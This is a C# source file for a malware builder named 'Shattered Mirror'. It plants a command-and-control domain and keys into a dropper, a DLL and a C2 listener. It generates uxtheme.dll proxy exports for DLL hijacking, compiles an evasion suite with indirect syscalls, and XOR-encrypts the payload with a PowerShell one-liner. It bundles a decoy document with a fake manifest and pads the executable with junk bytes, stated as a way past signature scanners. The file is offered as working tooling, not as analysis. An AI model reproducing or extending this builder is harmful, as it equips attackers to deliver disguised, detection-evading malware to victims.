using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using System.Collections.Generic;
using System.Threading;

namespace ShatteredMirror_Builder
{
    public class PayloadCompiler
    {
        private string _sourceDir;
        private string _outputDir;
        private string _decoyFile;
        private string _c2Domain;
        private string _c2Port;
        private string _c2Seed;
        public string DecoyPath { get; set; } = "";
        public StringBuilder BuildLogs { get; private set; } = new StringBuilder();

        private void Log(string msg) {
            BuildLogs.AppendLine(msg);
        }

        public PayloadCompiler(string sourceDir = "..", string outputDir = ".\\Output", string decoyFile = "", 
                               string c2Domain = "c2.attacker.com", string c2Port = "443", string c2Seed = "SuperSecretSeedForClient001")
        {
            _sourceDir = Path.GetFullPath(sourceDir);
            _outputDir = Path.GetFullPath(outputDir);
            _decoyFile = string.IsNullOrEmpty(decoyFile) ? "" : Path.GetFullPath(decoyFile);
            DecoyPath = _decoyFile;
            _c2Domain = c2Domain;
            _c2Port = c2Port;
            _c2Seed = c2Seed;
        }

        public bool BuildPayload()
        {
            BuildLogs.Clear();
            Log("[+] Finalizing Shattered Mirror Polymorphic Build...");
            Log($"[*] C2 Target: {_c2Domain}:{_c2Port}");

            // Generate building-specific cryptographic keys
            string sessionKey = GenerateRandomString(16);
            string xorKey = GenerateRandomString(12);
            string payloadXorKey = GenerateRandomString(16);

            Log($"[*] Generated session key: {sessionKey}");
            Log($"[*] Generated XOR key (Decoy): {xorKey}");
            Log($"[*] Generated XOR key (Payload): {payloadXorKey}");

            try {
                // 2. Perform dynamic configuration injection into Config.h
                RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\* C2_DOMAIN = ""([^""]+)""", $@"static const char* C2_DOMAIN = ""{_c2Domain}""");
                RegexReplaceInFile("Orchestrator\\Config.h", @"static const int   C2_PORT   = (\d+)", $@"static const int   C2_PORT   = {_c2Port}");
                RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\* PSK_SEED = ""([^""]+)""", $@"static const char* PSK_SEED = ""{_c2Seed}""");
                RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\* PSK_ID     = ""([^""]+)""", $@"static const char* PSK_ID     = ""{sessionKey}""");
                
                // Inject the build-specific session key into EVERYTHING
                RegexReplaceInFile("C2_Backend\\listener.py", @"TARGET_SEED = b""([^""]+)""", $@"TARGET_SEED = b""{_c2Seed}""");
                RegexReplaceInFile("Builder_GUI\\Dropper_Template.cpp", @"#define PAYLOAD_KEY ""([^""]+)""", $@"#define PAYLOAD_KEY ""{payloadXorKey}""");
                RegexReplaceInFile("Builder_GUI\\Dropper_Template.cpp", @"#define DECOY_KEY ""([^""]+)""", $@"#define DECOY_KEY ""{xorKey}""");

                // Batch-update all Atoms using the same robust regex logic
                string atomsDir = Path.Combine(_sourceDir, "Atoms");
                if (Directory.Exists(atomsDir)) {
                    foreach (string file in Directory.GetFiles(atomsDir, "*.cpp")) {
                        string relPath = Path.GetRelativePath(_sourceDir, file);
                        RegexReplaceInFile(relPath, @"BYTE SharedSessionKey\[\] = ""([^""]+)""", $@"BYTE SharedSessionKey[] = ""{sessionKey}""");
                    }
                }

                // 3. Prepare the Dynamic Proxy Header (No more manual guessing!)
                Log("[*] Dynamically resolving UXTheme exports from system...");
                ResolveDynamicExports();

                // 4. Prepare the Decoy File
                if (!string.IsNullOrEmpty(DecoyPath) && File.Exists(DecoyPath)) {
                    Log($"[*] Embedding user decoy: {Path.GetFileName(DecoyPath)}");
                    PrepareDecoy(xorKey, DecoyPath);
                } else {
                    Log("[*] No decoy selected. Building silent payload.");
                    File.WriteAllBytes(Path.Combine(_sourceDir, "payload.bin"), new byte[0]); // Empty decoy
                }

                // 4. Generate the build script that compiles and encrypts everything
                string buildScript = GenerateBuildBat(payloadXorKey);
                string batPath = Path.Combine(_sourceDir, "_shattered_build_tmp.bat");
                File.WriteAllText(batPath, buildScript);
                Log("[+] Generated temporary build pipeline.");


                // 5. Automatically Run the Build (One-Click Magic)
                Log("[*] Executing Compiler Pipeline (This may take a moment)...");
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", $"/c \"\"{batPath}\"\"")
                {
                    WorkingDirectory = _sourceDir,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                };
                
                using (Process? process = Process.Start(psi))
                {
                    if (process == null) return false;
                    
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    
                    if (!string.IsNullOrEmpty(output)) Log(output);
                    
                    if (process.ExitCode != 0) {
                        string logFile = Path.Combine(_outputDir, "build_error.log");
                        File.WriteAllText(logFile, output + "\n" + error);
                        Log($"[!] BUILD FAILED. Error log saved to: {logFile}");
                        return false;
                    }
                }
                
                Log("[+] Build Pipeline Completed Perfectly.");
                
                // 6. Finalize Naming
                string finalExe = Path.Combine(_outputDir, "Shattered_Mirror.exe");
                string builtExe = Path.Combine(_sourceDir, "Dropper.exe");
                
                if (File.Exists(builtExe)) {
                    // ---> FIX: Ensure the output directory actually exists! <---
                    Directory.CreateDirectory(_outputDir);
                    
                    if (File.Exists(finalExe)) File.Delete(finalExe);
                    File.Move(builtExe, finalExe);
                    
                    // 7. Bloat the final EXE to bypass AI signatures
                    BloatFile(finalExe);
                    Log($"[+] Payload Ready: {finalExe}");
                }
                
                return true;
            }
            catch (Exception ex)
            {
                Log($"[!] Build logic failed: {ex.Message}");
                return false;
            }
        }


        private void BloatFile(string filePath)
        {
            if (!File.Exists(filePath)) return;
            
            // Append 5MB of random-looking Junk data at the end (Overlay)
            // This confuses AI signatures which often scan fixed-offsets.
            using (FileStream fs = new FileStream(filePath, FileMode.Append))
            {
                byte[] junk = new byte[1024 * 1024 * 5]; // 5MB Bloat
                new Random().NextBytes(junk);
                fs.Write(junk, 0, junk.Length);
            }
        }


        private void RegexReplaceInFile(string relativePath, string pattern, string replacement)
        {
            string fullPath = Path.Combine(_sourceDir, relativePath);
            if (!File.Exists(fullPath)) return;

            string content = File.ReadAllText(fullPath);
            string newContent = System.Text.RegularExpressions.Regex.Replace(content, pattern, replacement);
            
            if (content != newContent)
            {
                File.WriteAllText(fullPath, newContent, Encoding.UTF8);
            }
        }

        private void KillLockingProcesses()
        {
            try {
                foreach (var proc in Process.GetProcessesByName("NoteSvc")) proc.Kill();
                foreach (var proc in Process.GetProcessesByName("VaultSvc")) proc.Kill();
                foreach (var proc in Process.GetProcessesByName("Shattered_Mirror")) proc.Kill();
                Thread.Sleep(500);
            } catch { }
        }

        private void PrepareDecoy(string xorKey, string filePath)
        {
            byte[] data = File.ReadAllBytes(filePath);
            string ext = Path.GetExtension(filePath).TrimStart('.');
            
            // Format: [1 byte ext len][ext string][data]
            byte[] extBytes = Encoding.ASCII.GetBytes(ext);
            List<byte> combined = new List<byte>();
            combined.Add((byte)extBytes.Length);
            combined.AddRange(extBytes);
            combined.AddRange(data);

            byte[] encrypted = XORScale(combined.ToArray(), xorKey);
            File.WriteAllBytes(Path.Combine(_sourceDir, "Builder_GUI\\decoy.bin"), encrypted);

            // Generate resource file with Manifest
            string rcContent = "101 RCDATA \"Builder_GUI\\\\decoy.bin\"\r\n" +
                               "102 RCDATA \"payload.bin\"\r\n" +
                               "1 RT_MANIFEST \"Builder_GUI\\\\app.manifest\"\r\n";
            File.WriteAllText(Path.Combine(_sourceDir, "Builder_GUI\\dropper.rc"), rcContent);

            // Create a fake, legitimate manifest
            string manifest = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\r\n" +
                              "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\r\n" +
                              "<assemblyIdentity name=\"ShatteredMirror.App\" processorArchitecture=\"amd64\" version=\"1.0.0.0\" type=\"win32\"/>\r\n" +
                              "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\r\n" +
                              "<application><supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/></application>\r\n" +
                              "</compatibility></assembly>";
            File.WriteAllText(Path.Combine(_sourceDir, "Builder_GUI\\app.manifest"), manifest);
        }


        private string ApplySpoofing()
        {
            string finalExe = Path.Combine(_sourceDir, "Dropper.exe");
            if (!File.Exists(finalExe)) return "";
            
            // Output name is now a standard, pure .exe. No RTLO tricks.
            string newName = "Shattered_Mirror.exe";
            
            string destPath = Path.Combine(_sourceDir, newName);
            if (File.Exists(destPath)) File.Delete(destPath);
            File.Move(finalExe, destPath);
            return destPath;
        }



        private string GenerateBuildBat(string payloadXorKey)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("@echo off");
            sb.AppendLine("SET \"VS_PATH=C:\\Program Files (x86)\\Microsoft Visual Studio\\18\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat\"");
            sb.AppendLine("if not exist \"%VS_PATH%\" ( echo [!] VS Build Tools not found! && exit /b 1 )");
            sb.AppendLine("call \"%VS_PATH%\"");
            sb.AppendLine("");
            sb.AppendLine("echo [*] Compiling Shattered Mirror DLL (UXTheme.dll)...");
            sb.AppendLine("ml64 /c /Fo Evasion_Suite\\IndirectSyscalls.obj Evasion_Suite\\IndirectSyscalls.asm");
            sb.AppendLine("cl.exe /EHsc /O2 /GS- /LD /I Evasion_Suite\\include ^");
            sb.AppendLine("Orchestrator\\ProxyLogic.cpp Orchestrator\\VEH_Handler.cpp Orchestrator\\AtomManager.cpp Orchestrator\\IPC_Channel.cpp ^");
            sb.AppendLine("Evasion_Suite\\src\\*.cpp Atoms\\*.cpp Evasion_Suite\\IndirectSyscalls.obj ^");
            sb.AppendLine("advapi32.lib winhttp.lib bcrypt.lib user32.lib shell32.lib ^");
            sb.AppendLine("/Fe:UXTheme.dll /link /IMPLIB:UXTheme.lib");
            sb.AppendLine("");
            sb.AppendLine("echo [*] Encrypting Payload (UXTheme.dll -^> payload.bin)...");
            // Robust PowerShell XOR: Convert key to bytes first and perform perfect math.
            sb.AppendLine($"powershell -NoProfile -Command \"$b=[IO.File]::ReadAllBytes('UXTheme.dll');$k=[Text.Encoding]::ASCII.GetBytes('{payloadXorKey}');for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor $k[$i %% $k.Length]}};[IO.File]::WriteAllBytes('payload.bin',$b)\"");
            sb.AppendLine("");
            sb.AppendLine("if not exist \"payload.bin\" ( echo [!] FAILED: payload.bin missing! && exit /b 1 )");
            sb.AppendLine("echo [*] Packaging Resources...");
            sb.AppendLine("rc.exe /nologo /i Builder_GUI Builder_GUI\\dropper.rc");
            sb.AppendLine("echo [*] Compiling Master Stager (Dropper.exe)...");
            sb.AppendLine("cl.exe /EHsc /O2 /GS- Builder_GUI\\Dropper_Template.cpp Builder_GUI\\dropper.res advapi32.lib shell32.lib user32.lib gdi32.lib comdlg32.lib /Fe:Dropper.exe");

            sb.AppendLine("echo [*] Build step status: %errorlevel%");
            sb.AppendLine("exit /b 0");
            return sb.ToString();
        }

        private void ResolveDynamicExports()
        {
            string systemPath = "C:\\Windows\\System32\\uxtheme.dll";
            if (!File.Exists(systemPath)) return;

            StringBuilder exports = new StringBuilder();
            exports.AppendLine("/* DYNAMICALLY GENERATED BY SHATTERED BUILDER */");
            
            // To be truly solid, we'll parse the PE exports using a raw byte-reading PowerShell loop.
            // This avoids any "MethodNotFound" or "LoadLibrary" issues.
            string psCommand = "$ErrorActionPreference = 'Stop'; $file = '" + systemPath + "'; " +
                "$bytes = [System.IO.File]::ReadAllBytes($file); " +
                "$offset = [System.BitConverter]::ToInt32($bytes, 0x3C); " +
                "$exportDirRva = [System.BitConverter]::ToInt32($bytes, $offset + 0x88); " +
                "$sectionHeadersStart = $offset + 0x108; $rva = $exportDirRva; " +
                "for($i=0; $i -lt 10; $i++) { " +
                "  $sRva = [System.BitConverter]::ToInt32($bytes, $sectionHeadersStart + ($i * 0x28) + 12); " +
                "  $sSize = [System.BitConverter]::ToInt32($bytes, $sectionHeadersStart + ($i * 0x28) + 8); " +
                "  if($rva -ge $sRva -and $rva -lt ($sRva + $sSize)) { " +
                "    $fo = $rva - $sRva + [System.BitConverter]::ToInt32($bytes, $sectionHeadersStart + ($i * 0x28) + 20); break; " +
                "  } " +
                "} " +
                "$numNames = [System.BitConverter]::ToInt32($bytes, $fo + 0x18); " +
                "$namesRva = [System.BitConverter]::ToInt32($bytes, $fo + 0x20); " +
                "$nfo = $namesRva - $sRva + [System.BitConverter]::ToInt32($bytes, $sectionHeadersStart + ($i * 0x28) + 20); " +
                "for($j=0; $j -lt $numNames; $j++) { " +
                "  $nRva = [System.BitConverter]::ToInt32($bytes, $nfo + ($j * 4)); " +
                "  $nf = $nRva - $sRva + [System.BitConverter]::ToInt32($bytes, $sectionHeadersStart + ($i * 0x28) + 20); " +
                "  $name = ''; while($bytes[$nf] -ne 0) { $name += [char]$bytes[$nf]; $nf++; } " +
                "  Write-Output $name " +
                "}";

            ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", $"-NoProfile -Command \"{psCommand}\"")
            {
                RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
            };

            using (Process? p = Process.Start(psi))
            {
                if (p == null) return;
                while (!p.StandardOutput.EndOfStream)
                {
                    string? name = p.StandardOutput.ReadLine();
                    if (!string.IsNullOrEmpty(name))
                    {
                        // Use a full path EXCLUDING the extension to satisfy the linker's specific path requirements
                        string targetPath = "C:\\\\Windows\\\\System32\\\\uxtheme";
                        exports.AppendLine($"#pragma comment(linker, \"/export:{name}={targetPath}.{name}\")");
                    }
                }
                p.WaitForExit();
            }

            // Also add standard fallback ordinals used by nearly all shells
            for (int ord = 132; ord <= 139; ord++) {
                string targetPath = "C:\\\\Windows\\\\System32\\\\uxtheme";
                exports.AppendLine($"#pragma comment(linker, \"/export:#{ord}={targetPath}.#{ord},@{ord},NONAME\")");
            }

            // Inject into ProxyLogic.cpp using a special hook tag
            string proxyPath = Path.Combine(_sourceDir, "Orchestrator\\ProxyLogic.cpp");
            if (File.Exists(proxyPath))
            {
                string content = File.ReadAllText(proxyPath);
                string startTag = "/* START DYNAMIC EXPORTS */";
                string endTag = "/* END DYNAMIC EXPORTS */";

                int start = content.IndexOf(startTag);
                int end = content.IndexOf(endTag);

                if (start != -1 && end != -1)
                {
                    string newContent = content.Substring(0, start + startTag.Length + 1) + 
                                       exports.ToString() + 
                                       content.Substring(end);
                    File.WriteAllText(proxyPath, newContent);
                }
            }
        }

        private byte[] XORScale(byte[] data, string key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++) {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }

        private string GenerateRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            StringBuilder result = new StringBuilder(length);
            byte[] data = RandomNumberGenerator.GetBytes(length);
            foreach (byte b in data) result.Append(chars[b % chars.Length]);
            return result.ToString();
        }
    }
}
